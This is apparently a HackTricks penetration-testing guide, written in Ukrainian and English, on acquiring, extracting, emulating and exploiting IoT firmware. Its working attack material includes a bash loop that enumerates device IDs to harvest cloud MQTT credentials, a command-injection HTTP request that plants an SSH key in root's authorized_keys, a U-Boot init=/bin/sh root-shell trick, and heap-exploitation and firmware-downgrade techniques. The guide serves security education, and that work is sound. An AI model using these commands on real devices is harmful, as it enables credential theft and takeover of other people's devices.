# Аналіз Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов’язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware є критично важливим software, який дає змогу devices працювати коректно, керуючи та забезпечуючи communication між hardware components і software, з яким взаємодіє користувач. Він зберігається в permanent memory, що гарантує, що device може отримати доступ до життєво важливих інструкцій від моменту вмикання, що веде до запуску operating system. Вивчення та потенційне модифікування firmware є критичним кроком у виявленні security vulnerabilities.

## **Збір інформації**

**Збір інформації** — це критично важливий початковий крок у розумінні складу device та технологій, які він використовує. Цей процес передбачає збирання даних про:

- CPU architecture та operating system, на якому він працює
- Bootloader specifics
- Hardware layout та datasheets
- Codebase metrics та source locations
- External libraries та license types
- Update histories та regulatory certifications
- Architectural and flow diagrams
- Security assessments та identified vulnerabilities

Для цієї мети інструменти **open-source intelligence (OSINT)** є безцінними, як і аналіз будь-яких доступних open-source software components через ручні та автоматизовані процеси review. Інструменти на кшталт [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore) пропонують free static analysis, яку можна використати для пошуку potential issues.

## **Отримання Firmware**

Отримання firmware можна здійснювати різними способами, кожен із власним рівнем complexity:

- **Безпосередньо** від джерела (developers, manufacturers)
- **Збираючи** його з наданих інструкцій
- **Завантажуючи** з official support sites
- Використовуючи запити **Google dork** для пошуку hosted firmware files
- Отримуючи доступ до **cloud storage** directly, за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплюючи **updates** через man-in-the-middle techniques
- **Витягуючи** з device через connections на кшталт **UART**, **JTAG** або **PICit**
- **Sniffing** update requests у device communication
- Виявляючи та використовуючи **hardcoded update endpoints**
- **Dumping** із bootloader або network
- **Вилучаючи та зчитуючи** storage chip, коли все інше не допомагає, використовуючи відповідні hardware tools

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Аналіз firmware

Тепер, коли ви **маєте firmware**, потрібно витягти з нього інформацію, щоб знати, як із ним поводитися. Різні інструменти, які можна для цього використати:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Getting the Filesystem

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть таку **dd command** для витягування файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується в прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії "`squashfs-root`".

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Для ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо розібрати його, щоб зрозуміти структуру та потенційні вразливості. Цей процес передбачає використання різних tools для аналізу та вилучення цінних даних з firmware image.

### Початкові tools для аналізу

Наведено набір команд для початкового огляду binary file (далі — `<bin>`). Ці команди допомагають визначати file types, витягувати strings, аналізувати binary data та розуміти деталі partition і filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **entropy** за допомогою `binwalk -E <bin>`. Низька entropy вказує на відсутність шифрування, тоді як висока entropy означає можливе шифрування або стиснення.

Для витягування **embedded files** рекомендуються такі інструменти та ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для аналізу файлів.

### Витягування Filesystem

Використовуючи `binwalk -ev <bin>`, зазвичай можна витягнути filesystem, часто в каталог із назвою за типом filesystem (наприклад, squashfs, ubifs). Однак, коли **binwalk** не може розпізнати тип filesystem через відсутні magic bytes, потрібне ручне витягування. Це передбачає використання `binwalk` для визначення offset filesystem, а потім команди `dd` для вирізання filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу filesystem (наприклад, squashfs, cpio, jffs2, ubifs), використовуються різні команди для ручного витягування вмісту.

### Аналіз filesystem

Після витягування filesystem починається пошук security flaws. Увага приділяється insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts та compiled binaries для offline analysis.

**Ключові розташування** і **елементи** для перевірки включають:

- **etc/shadow** і **etc/passwd** для user credentials
- SSL certificates і keys у **etc/ssl**
- Configuration та script files на предмет potential vulnerabilities
- Embedded binaries для подальшого analysis
- Common IoT device web servers і binaries

Кілька tools допомагають виявляти sensitive information та vulnerabilities у filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для search sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), і [**EMBA**](https://github.com/e-m-b-a/emba) для static and dynamic analysis

### Security Checks on Compiled Binaries

І source code, і compiled binaries, знайдені у filesystem, потрібно ретельно перевіряти на наявність vulnerabilities. Tools like **checksec.sh** для Unix binaries і **PESecurity** для Windows binaries допомагають identify unprotected binaries, які можна exploit.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Багато IoT hubs отримують per-device configuration з cloud endpoint, який виглядає так:

- `https://<api-host>/pf/<deviceId>/<token>`

Під час firmware analysis ви можете виявити, що `<token>` locally derived з device ID за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений як uppercase hex

Такий design дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і отримати cloud config, часто розкриваючи plaintext MQTT credentials і topic prefixes.

Практичний workflow:

1) Extract deviceId з UART boot logs

- Підключіть 3.3V UART adapter (TX/RX/GND) і capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять pattern URL cloud config і broker address, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновіть STATIC_KEY і token algorithm з firmware

- Завантажте binaries у Ghidra/radare2 і шукайте config path ("/pf/") або використання MD5.
- Підтвердьте algorithm (наприклад, MD5(deviceId||STATIC_KEY)).
- Виведіть token у Bash і переведіть digest у uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збирайте cloud config та MQTT credentials

- Сформуйте URL і отримайте JSON за допомогою curl; розберіть його з jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживання plaintext MQTT і weak topic ACLs (якщо присутні)

- Використайте відновлені credentials, щоб підписатися на maintenance topics і шукати sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перелічіть передбачувані device IDs (у масштабі, з authorization)

- Багато ecosystems вбудовують vendor OUI/product/type bytes, а потім sequential suffix.
- Ви можете перебирати candidate IDs, deriving tokens і programmatically fetch configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробою mass enumeration.
- Надавайте перевагу emulation або static analysis, щоб відновити secrets без зміни target hardware, коли це можливо.


Процес emulating firmware enables **dynamic analysis** або роботи пристрою, або окремої програми. Цей підхід може стикатися з труднощами через hardware або architecture dependencies, але перенесення root filesystem або specific binaries на пристрій із matching architecture та endianness, наприклад Raspberry Pi, або в pre-built virtual machine, може полегшити подальше testing.

### Emulating Individual Binaries

Для аналізу окремих програм ключовим є визначення їхнього endianness і CPU architecture.

#### Example with MIPS Architecture

Щоб emulate binary з MIPS architecture, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні tools для emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарників вибором буде `qemu-mipsel`.

#### ARM Architecture Emulation

Для ARM бінарників процес подібний, з використанням емулятора `qemu-arm` для емуляції.

### Full System Emulation

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), та інші, спрощують full firmware emulation, автоматизуючи процес і допомагаючи в dynamic analysis.

## Dynamic Analysis in Practice

На цьому етапі для аналізу використовується або реальне, або емуляційне середовище пристрою. Важливо підтримувати shell access до ОС і файлової системи. Емуляція може не ідеально відтворювати взаємодію з hardware, тому іноді потрібні перезапуски емуляції. Аналіз має знову перевіряти файлову систему, експлуатувати відкриті вебсторінки та network services, а також досліджувати вразливості bootloader. Тести цілісності firmware є критично важливими для виявлення можливих backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis передбачає взаємодію з процесом або бінарником у його робочому середовищі, з використанням інструментів на кшталт gdb-multiarch, Frida та Ghidra для встановлення breakpoints і виявлення вразливостей через fuzzing та інші техніки.

Для embedded targets без повноцінного debugger, **скопіюйте statically-linked `gdbserver`** на пристрій і під’єднайтеся remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

На IoT hubs RF stack часто розділений між **radio MCU** і Linux userland process. Корисний workflow — зіставити шлях:

1. **RF frame** в ефірі
2. **controller-side parser** на radio MCU
3. **serial/UART text or TLV protocol** переадресований до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** у main daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює два reversing targets замість одного. Якщо controller перетворює binary radio frames у textual protocol на кшталт `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які messages можуть надходити з **network** versus самого controller
- Точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers reachable only під час **commissioning**, discovery, або firmware/model download phases

Для Zigbee зокрема, capture pairing traffic і перевірте, чи target досі покладається на default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цю exposure, тож зазначте, чи tested device реально enforce-ить їх.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж стандартизовані clusters, тому що вони feed **custom parsing code** і internal **FSMs** з менш перевіреною validation.

Практичний workflow:

- Reverse command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, що auto-advance, і retry/error branches, які зрештою reset або free attacker-controlled state.
- Підтвердьте, які legitimate protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди reachable.

Для timing-sensitive protocols packet replay з Python framework може бути надто повільним. Надійніший підхід — емулювати legitimate device на real hardware (наприклад, **nRF52840**) з vendor-grade stack, щоб можна було expose правильні **endpoints**, **attributes** і commissioning timing.

### Fragmented-download bug class in embedded daemons

Повторюваний class firmware bug з’являється в **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) зберігає `ctx->total_size` і allocates `malloc(total_size)`.
2. Пізніші fragments лише validate attacker-controlled **packet-local** fields, такі як `packet_total_size >= offset + chunk_len`.
3. Copy використовує `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **original allocated size**.

Це дозволяє attacker-у надіслати:

- First valid fragment with a **small** declared total size, щоб примусити small heap allocation.
- Пізніший fragment з **expected offset**, але більшим `chunk_len`.
- Forged packet-local size, що satisfies fresh checks, але все ще overflow-ить originally allocated buffer.

Коли vulnerable path сидить за commissioning logic, exploitation має включати достатньо **device emulation**, щоб загнати target у expected model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростіший спосіб trigger heap metadata exploitation часто не "дочекатися cleanup", а **force the protocol's own error handling**:

- Надсилайте malformed follow-up fragments, щоб push FSM у **retry** або **error** states.
- Перевищуйте retry threshold, щоб daemon **resets context** і free-ив corrupted buffer.
- Використовуйте цей predictable `free()` для trigger allocator-side primitives перед тим, як process crashes з unrelated reasons.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де corruption chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний pattern — corrupt **size field**, щоб redirect allocator traversal у **fake chunks staged inside the overflowed buffer**, замість того, щоб одразу clobberити real bin pointers і crash-нути process.

## Binary Exploitation and Proof-of-Concept

Розробка PoC для identified vulnerabilities вимагає глибокого розуміння target architecture і програмування lower-level languages. Binary runtime protections в embedded systems трапляються рідко, але коли вони присутні, можуть знадобитися techniques like Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніше велике allocation може trigger-нути `__malloc_consolidate()`, тож будь-який fake chunk має пройти checks (sane size, `fd = 0`, і surrounding chunks мають виглядати як "in use").
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але main binary є **non-PIE**, адреси `.data/.bss` всередині binary стабільні. Можна цілити в region, який уже схожий на valid heap chunk header, щоб приземлити fastbin allocation на **function pointer table**.
- **Parser-stopping NUL:** коли JSON parsed, `\x00` у payload може зупинити parsing, зберігши trailing attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, що викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може записати executable shellcode у відоме mapping і jump-нути до нього.

## Prepared Operating Systems for Firmware Analysis

Операційні системи на кшталт [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS) надають pre-configured environments для firmware security testing, оснащені потрібними tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — це distro, призначене допомогти вам виконувати security assessment і pentesting Internet of Things (IoT) devices. Воно економить багато часу, надаючи pre-configured environment з усіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04, preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor implement-ить cryptographic signature checks для firmware images, **version rollback (downgrade) protection** часто omitted. Коли boot- або recovery-loader лише verify-ить signature за допомогою embedded public key, але не порівнює *version* (або monotonic counter) image, який flash-иться, attacker може legitimately install-ити **older, vulnerable firmware that still bears a valid signature** і таким чином re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Візьміть його з vendor’s public download portal, CDN або support site.
* Extract його з companion mobile/desktop applications (наприклад, всередині Android APK у `assets/firmware/`).
* Retrieve його з third-party repositories на кшталт VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Багато consumer IoT devices expose *unauthenticated* HTTP(S) endpoints, які accept-ять Base64-encoded firmware blobs, decode-ять їх server-side і trigger-ять recovery/upgrade.
3. Після downgrade exploit-ніть vulnerability, яка була patched у newer release (наприклад, command-injection filter, доданий пізніше).
4. За бажанням flash-ніть latest image назад або disable-ніть updates, щоб уникнути detection після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (downgraded) firmware параметр `md5` безпосередньо конкатенується в shell command без sanitisation, що дозволяє injection довільних commands (тут – увімкнення SSH key-based root access). У пізніших версіях firmware було запроваджено базовий character filter, але відсутність downgrade protection робить це виправлення марним.

### Extracting Firmware From Mobile Apps

Багато vendors пакують повні firmware images всередину своїх companion mobile applications, щоб app могла оновлювати device через Bluetooth/Wi-Fi. Такі packages зазвичай зберігаються unencrypted у APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Tools на кшталт `apktool`, `ghidra` або навіть plain `unzip` дозволяють витягнути signed images без взаємодії з physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Чекліст для оцінки логіки оновлення

* Чи достатньо захищені transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **monotonic anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи виконує userland code додаткові sanity checks (наприклад, allowed partition map, model number)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡 Якщо чогось із наведеного вище немає, platform, ймовірно, вразлива до rollback attacks.

## Vulnerable firmware to practice

Щоб практикувати виявлення vulnerabilities у firmware, використовуйте такі vulnerable firmware projects як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
